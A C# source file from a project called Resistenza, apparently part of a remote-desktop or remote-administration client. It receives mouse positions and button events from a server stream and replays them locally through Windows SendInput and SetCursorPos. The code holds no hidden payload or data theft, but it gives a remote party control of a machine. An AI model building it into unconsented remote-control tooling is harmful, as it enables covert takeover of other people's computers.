using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Resistenza.Common.Packets.Remote_Desktop
{
    public class DesktopMouseActionRequest
    {
        public string Type { get; set; }
        public int MousePosX { get; set; }
        public int MousePosY { get; set; }

        public MouseMessages MouseMessage { get; set; }


        public DesktopMouseActionRequest()
        {

            Type = this.GetType().ToString();

        }

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        [StructLayout(LayoutKind.Sequential)]
        private struct INPUT
        {
            public int type;
            public MOUSEINPUT mi;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MOUSEINPUT
        {
            public int dx;
            public int dy;
            public int mouseData;
            public int dwFlags;
            public int time;
            public IntPtr dwExtraInfo;
        }

        private const int MOUSEEVENTF_ABSOLUTE = 0x8000;



        public async Task HandleAsync(SecureStream _ServerStream)
        {
            await Task.Run(()=>{
                switch (MouseMessage)
                {
                    case MouseMessages.WM_MOUSEMOVE:
                        SetCursorPos(MousePosX, MousePosY);
                        return;
                    default:
                        InputMouseData flag;
                        MouseInputToMouseData.TryGetValue(MouseMessage, out flag);
                        int integer_converted = (int)flag;
                        
                        SendMouseInput(integer_converted);

                        return;

                }
            });
        }

        private static void SendMouseInput(int mouseEventFlags)
        {
            INPUT mouseInput = new INPUT
            {
                type = 0, //sarebbe INPUT_MOUSE
                mi = new MOUSEINPUT
                {
                    dx = 0,
                    dy = 0,
                    mouseData = 0,
                    dwFlags = mouseEventFlags | MOUSEEVENTF_ABSOLUTE,
                    time = 0,
                    dwExtraInfo = IntPtr.Zero
                }

            };

            INPUT[] inputs = { mouseInput };
            SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(INPUT)));
        }

        private Dictionary<MouseMessages, InputMouseData> MouseInputToMouseData = new()
{
    { MouseMessages.WM_LBUTTONDOWN, InputMouseData.MOUSEEVENTF_LEFTDOWN },
    { MouseMessages.WM_LBUTTONUP, InputMouseData.MOUSEEVENTF_LEFTUP },
    { MouseMessages.WM_RBUTTONDOWN, InputMouseData.MOUSEEVENTF_RIGHTDOWN },
    { MouseMessages.WM_RBUTTONUP, InputMouseData.MOUSEEVENTF_RIGHTUP }
};

        private enum InputMouseData
        {
            MOUSEEVENTF_LEFTDOWN = 0x0002,
            MOUSEEVENTF_LEFTUP = 0x0004,
            MOUSEEVENTF_RIGHTDOWN = 0x0008,
            MOUSEEVENTF_RIGHTUP = 0x0010
        }
    }

    

    public enum MouseMessages
    {
        WM_LBUTTONDOWN = 0x0201,
        WM_LBUTTONUP = 0x0202,
        WM_MOUSEMOVE = 0x0200,
        WM_MOUSEWHEEL = 0x020A,
        WM_RBUTTONDOWN = 0x0204,
        WM_RBUTTONUP = 0x0205
    }

    
}
